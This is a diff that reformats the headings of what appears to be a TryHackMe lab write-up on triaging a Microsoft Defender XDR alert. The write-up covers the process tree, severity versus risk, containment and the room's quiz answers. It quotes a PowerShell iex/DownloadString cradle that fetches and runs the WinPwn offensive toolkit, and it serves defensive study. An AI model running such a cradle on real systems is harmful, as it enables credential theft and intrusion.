@@ -1,16 +1,16 @@
-Lab Walkthrough — Incident Investigation
+## Lab Walkthrough — Incident Investigation
 
-6.1 Alert Overview
+### 6.1 Alert Overview
 
 FieldValueAlert nameA script with suspicious content was observedAlert severityShow ImageIncident risk levelShow ImageAffected devicevm-evil-xdr (Windows 11)User accountvm-evil-xdr\evil-xdrDetection sourceEDRMITRE techniqueT1059.001 (PowerShell) + 2 additional related techniquesTimestamp14 May 2026, 15:08:32Process ID5104 (powershell.exe)Integrity levelHigh
 
-## Alert Overview
+### Alert Overview
 
 ![Alert Overview](screenshots/the_alert.png)
 
 
 
-6.2 Process Tree and Command Line
+### 6.2 Process Tree and Command Line
 
 The initiating process was powershell_ise.exe (PID 11080), which spawned a child powershell.exe process (PID 5104) executing a remote download-and-run cradle:
 
@@ -20,13 +20,13 @@ powershellpowershell.exe & {iex(new-object net.webclient).downloadstring(
 ) -MS17-10 -noninteractive -consoleoutput}
 ```
 
-## Alert Details
+### Alert Details
 
 ![alert details](screenshots/alert_details.png)
 
 
 
-6.3 Technical Breakdown
+### 6.3 Technical Breakdown
 
 
 Invoke-Expression (iex) takes the string it receives and executes it as a live command — the mechanism behind most fileless PowerShell attacks.
@@ -34,7 +34,7 @@ New-Object Net.WebClient).DownloadString(...) reaches out to an external URL, pu
 The target repository (WinPwn) is a well-known, publicly available offensive security automation framework. It performs local system triage, Active Directory misconfiguration discovery, credential dumping, and privilege-escalation path identification — the kind of toolkit used legitimately in authorized penetration tests, but equally attractive to a genuine intruder.
 
 
-6.4 Network & Infrastructure Context
+### 6.4 Network & Infrastructure Context
 
 FieldValueRemote session initiator IP10.5.0.2Remote session initiator deviceLAPTOP-FKQ39MRR
 
@@ -45,7 +45,7 @@ The process is flagged as a remote execution, meaning the operator was not physi
 
 
 
-6.5 Severity vs. Risk — Why They Diverge
+### 6.5 Severity vs. Risk — Why They Diverge
 
 One of the more instructive parts of this lab is that the alert severity (Medium) and the incident risk level (High) don't match — and that's by design, not an error.
 
@@ -56,7 +56,7 @@ Risk level answers "how bad is this in the context of what it touches?" — asse
 
 In this case, the underlying technique (a PowerShell download cradle) is a fairly common and well-understood pattern, hence Medium severity. But the session was running at High integrity, tied to an account with an active remote session to another device, which is why Defender XDR escalated the overall incident risk to High. This distinction directly drives SOC triage prioritization — a queue sorted purely by severity would have under-prioritized this incident.
 
-6.6 Response and Containment Actions Considered
+### 6.6 Response and Containment Actions Considered
 
 Once the alert is assessed as malicious, the following actions are available directly from the incident:
 
@@ -76,19 +76,19 @@ Pivot into Advanced Hunting ("Go hunt") to search the wider environment for rela
 
 
 
-7. Knowledge Check — Room Questions
+## 7. Knowledge Check — Room Questions
 
 #QuestionAnswer1Which Defender for Office 365 control prevents execution of harmful scripts/malware embedded in attachments?Safe Attachments2Which Defender for Endpoint ASR rule blocks scripts from launching malicious downloaded content?Block JavaScript or VBScript from launching downloaded executable content3Setting Defender for Endpoint device discovery to "standard discovery" is a prerequisite for which capability?Automatic attack disruption
 
 
-8. Defender XDR Controls Matrix — Execution Tactic
+## 8. Defender XDR Controls Matrix — Execution Tactic
 
 LayerDetectionPreventionMitigation / ResponseEndpointOnboard all devices to Defender for Endpoint; Advanced Hunting (Execution query templates)ASR rules (obfuscated scripts, email-based executable content, JS/VBScript launching downloads); Controlled Folder AccessAutomated Investigation & Response (AIR); Automatic Attack DisruptionIdentityDefender for Identity — anomalous behaviour detection tied to execution activity——Cloud AppsThreat detection policiesConditional Access App Control; Access and session policies—Email (Office 365)Zero-hour Auto Purge (ZAP)Anti-phishing policies; Safe Attachments; Safe Links—
 
 Automatic Attack Disruption in particular requires the full Defender stack (Endpoint, Office 365, Identity, Cloud Apps) deployed, device groups set to Full remediation, and endpoint discovery set to standard discovery — with a Global or Security Administrator role required to review and approve AIR/disruption actions.
 
 
-9. Reflection Questions
+## 9. Reflection Questions
 
 
 1. Why did the incident's risk level (High) diverge from the alert's severity (Medium), and what does that mean for how a SOC should build its triage queue?
@@ -115,7 +115,7 @@ The lab covers detect (EDR alert), triage (process tree + severity/risk analysis
 
 
 
-10. Key Takeaways
+## 10. Key Takeaways
 
 
 Practiced end-to-end alert triage inside Microsoft Defender XDR, from initial alert to command-line-level analysis
@@ -126,7 +126,7 @@ Practiced translating a technical finding (a PowerShell download cradle) into a 
 
 
 
-References
+## References
 
 
 TryHackMe, XDR: Execution
